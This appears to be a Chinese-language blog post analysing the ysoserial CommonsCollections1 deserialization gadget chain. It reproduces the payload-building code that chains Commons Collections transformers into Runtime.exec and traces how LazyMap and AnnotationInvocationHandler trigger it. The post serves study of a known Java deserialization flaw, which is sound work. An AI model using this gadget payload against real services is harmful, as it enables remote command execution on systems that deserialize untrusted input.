+++
title = "Ysoserial-CommonsCollections1"
publishDate = 2021-03-02T00:00:00+08:00
tags = ["java", "反序列化"]
draft = false
+++

<!--more-->


## Commons Collections {#commons-collections}

[Java Collections Framework](https://docs.oracle.com/javase/tutorial/collections/) 是 JDK1.2 中添加的类库，提供了很多集合相关的数据结构、接口、算法等，并成为了 Java 中公认的集合处理标准。

Commons Collections 则是 Apache 开发的第三方库，扩展了 Java 标准集合库的功能特性。其中一个重要的特性是：

```text
Transforming decorators that alter each object as it is added to the collection
```

Commons Collections 实现了一个 TransformedMap 类，该类是对 Java 标准数据结构 Map 接口的扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 类定义，Transformer 在 TransformedMap 实例化时作为参数传入。

`org.apache.commons.collections.Transformer` 这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，漏洞触发函数就是在于这个点。[^fn:1]


## POC {#poc}

首先看一下 CommonsCollections1#getObject 方法，该方法用来构造恶意对象：

```java
public InvocationHandler getObject(final String command) throws Exception {
    final String[] execArgs = new String[] { command };
    // 初始化ChainedTransformer
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    // Transformer数组，构成恶意代码的关键
    final Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {
            String.class, Class[].class }, new Object[] {
            "getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer("exec",
            new Class[] { String.class }, execArgs),
        new ConstantTransformer(1) };

    final Map innerMap = new HashMap();
    // 用于触发transformers的转化逻辑
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

    return handler;
}
```

上面的代码中，利用到的和 transformer 特性相关的类有 3 个：

1.  InvokerTransformer：通过反射机制实现转化，返回新实例。
2.  ConstantTransformer：将输入的常量原封不动地返回。
3.  ChainedTransformer：其 iTransformers 属性是一个 transformer 数组，可以依次执行每个元素的 transform 方法，且前一方法的返回值会作为后一方法的输入。

我们需要用到 InvokerTransformer#transform 中的反射机制来执行代码，该方法的关键逻辑如下：

```java
Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
return method.invoke(input, this.iArgs);
```

input 是调用方法时的参数，而 iMethodName、iParamTypes、iArgs 属性受我们控制。不难看出，如果想要调用 Runtime#exec 来执行命令，需要满足以下条件：

1.  input 是 Runtime 类的实例
2.  this.iMethodName = "exec"
3.  this.iParamTypes = String.class
4.  this.iArgs = command

满足后三点并没有难度，因为这三个属性值都可以被序列化，完全由我们控制。但正常情况下，目标不可能用 Runtime 实例作为参数，我们需要想办法控制 input 的值。

另外要知道的是，Runtime 类使用了单例模式，所以它的构造函数是私有的，不能通过 new
来获取实例，只能通过 Runtime#getRuntime 方法。所以我们要解决的关键问题是使 input
等效于：

```java
Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
```


## ChainedTransformer {#chainedtransformer}

想要控制 input 的值，需要利用 ChainedTransformer 类，其关键的 transform 方法如下：

```java
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }
    return object;
}
```

`this.iTransformers` 属性是一个 transformer 数组，我们可以利用该属性多次执行
InvokerTransformer#transform 方法。由于执行方法的返回值会作为下一次执行的输入，而这个返回值我们是可以一定程度上控制的，以此来达到控制 input 值的目的。

换句话说，我们现在将目的巧妙地转换成使返回值：

```java
method.invoke(input, this.iArgs);
```

等效于我们想要的 input 值：

```java
Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))
```

回顾一下 InvokerTransformer#transform：

```java
Class cls = input.getClass();
Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
return method.invoke(input, this.iArgs);
```

现在是不是觉得，只要让 cls 变量等于 `Runtime.class` 就大功告成了呢。但仔细一想，这不就回到开头说的要 input 为 Runtime 类的实例吗😵

既然我们可以通过 ChainedTransformer#transform 控制 input 值，那想办法在前面的循环中使返回值是 Runtime 类的实例不就好了？比如利用前面提到的 ConstantTransformer 类：

{{< figure src="/ox-hugo/2021-03-02_10-25-57_screenshot.png" >}}

只要在 transformer 数组添加元素 `new ConstantTransformer(Runtime.getRuntime())` ，下一次循环的输入就是 Runtime 实例。

然而 Runtime 类没有实现 Serializable 接口：

{{< figure src="/ox-hugo/2021-03-02_10-33-48_screenshot.png" >}}


## 反射 {#反射}

我们没有办法让 Runtime 对象序列化，但可以序列化 `Runtime.class` ，也就是
`java.lang.Class` 的对象。假设将 input 的值设为 `Runtime.class` ，我们可以利用下面的语句得到 Runtime#getRuntime：

```java
Class cls = input.getClass(); // cls == java.lang.Class
Method method = cls.getMethod("getMethod", paramTypes);
return method.invoke(input, new Object[] {"getRuntime", new Class[0] });
```

现在我们得到了 Runtime#getRuntime 的 Method 对象，再通过以下语句执行这个方法：

```java
Class cls = input.getClass(); // input == Method(getRuntime)
Method method = cls.getMethod("invoke", paramTypes);
return method.invoke(input, args);
```

这里巧妙地利用 invoke 方法来执行 invoke 方法，目的是将 invoke 的执行对象和参数转化成我们能控制的 input 和 args 变量。

我们调试一下 ysoserial 的 poc，以便于理解。关键的 transformer 数组如下：

```java
final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] {
        String.class, Class[].class }, new Object[] {
        "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] {
        Object.class, Object[].class }, new Object[] {
        null, new Object[0] }),
    new InvokerTransformer("exec",
        new Class[] { String.class }, execArgs),
    new ConstantTransformer(1) };
```

首先是 ConstantTransformer#transform 方法，返回 `Runtime.class` ：

{{< figure src="/ox-hugo/2021-03-02_14-06-53_screenshot.png" >}}

第一次调用 InvokerTransformer#transform，获取 Runtime#getRuntime 的 Method 对象：

{{< figure src="/ox-hugo/2021-03-02_14-08-49_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-03-02_14-10-22_screenshot.png" >}}

第二次调用 InvokerTransformer#transform，返回 Runtime 对象：

{{< figure src="/ox-hugo/2021-03-02_14-11-58_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-03-02_14-13-51_screenshot.png" >}}

上图还注意到了 `this.iArgs` 第一个值是 null，这对应着 invoke 方法的第一个参数，按理来说这应该是目标方法所在的对象，也就是 Runtime 对象。

{{< figure src="/ox-hugo/2021-03-02_14-18-15_screenshot.png" >}}

这里有一个知识点，当 invoke 调用的目标方法是静态方法时，第一个参数将无关紧要，目标类的相关信息已经在之前的步骤获取了。

比如在上面的执行流程中，第一次调用 InvokerTransformer#transform 获取
Runtime#getRuntime 时的 input 变量就是 `Runtime.class`

第三次调用 InvokerTransformer#transform，执行恶意代码：

{{< figure src="/ox-hugo/2021-03-02_14-25-35_screenshot.png" >}}

{{< figure src="/ox-hugo/2021-03-02_14-25-57_screenshot.png" >}}

现在我们只要调用 ChainedTransformer#transform，就能执行恶意代码了，剩下的问题就是怎么让目标自动调用这个方法了。


## 触发点 {#触发点}


### LazyMap {#lazymap}

期望目标在反序列化过程中直接执行 ChainedTransformer#transform 是不太现实的，我们需要通过更常规的操作来触发这一方法，比如 Map 数据结构的相关操作。

正好 Commons Collections 中提供了两个类，TransformedMap 和 LazyMap。它们的作用有点相似，都可以修饰一个 Map 数据，当对该 Map 数据进行操作时会触发 transform 过程。

因为 ysoserial 中用的是 LazyMap，所以只分析一下它的利用方法。它的 get 方法如下：

```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```

在第 3 行调用了一个 transform 方法，而 `this.factory` 可以在构造函数中赋值，我们将它设置为 ChainedTransformer 对象，然后想办法触发这个 get 方法。


### AnnotaionInvocationHandler {#annotaioninvocationhandler}

AnnotaionInvocationHandler 类的反序列过程中有 Map 的相关操作，可以利用它来触发
LazyMap#get。注意，在 JDK8 之后它的 readObject 方法更新了([diff](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java))，下面的方法就用不了了。[^fn:2]

首先看一下 getObject 方法中的代码：

{{< figure src="/ox-hugo/2021-03-02_18-03-27_screenshot.png" >}}

红框的代码利用了两层的动态代理来封装 lazyMap 对象，相关方法如下：

{{< figure src="/ox-hugo/2021-03-02_18-08-03_screenshot.png" >}}

第一次调用 createMemoitizedProxy 生成 mapProxy 代理对象，将 lazyMap 赋给它的 handler 的
memberValues 属性。

第二次调用 createMemoizedInvocationHandler 生成 handler 对象，将 mapProxy 赋给
memberValues 属性。

关系大致如下：

```java
handler.memberValues == mapProxy
mapProxy.handler.memberValues == lazyMap
```


## 反序列化 {#反序列化}

最后看一看反序列化的过程，也就是 AnnotaionInvocationHandler#readObject 的执行流程。

{{< figure src="/ox-hugo/2021-03-02_18-37-03_screenshot.png" >}}

这时的 `this.memberValues` 是 mapProxy 代理对象，调用它的 entrySet 方法会执行其 handler
的 invoke 方法。

来到 AnnotationInvocationHandler#invoke，注意这时的 this 和之前是不同实例了，而
`this.memberValues` 就是 lazyMap 对象。

{{< figure src="/ox-hugo/2021-03-02_18-44-13_screenshot.png" >}}

可以看到在 invoke 方法这调用了 lazyMap#get，成功执行命令。

{{< figure src="/ox-hugo/2021-03-02_18-47-58_screenshot.png" >}}

[^fn:1]: <https://xz.aliyun.com/t/7031>
[^fn:2]: <https://juejin.cn/post/6844903997011132423>
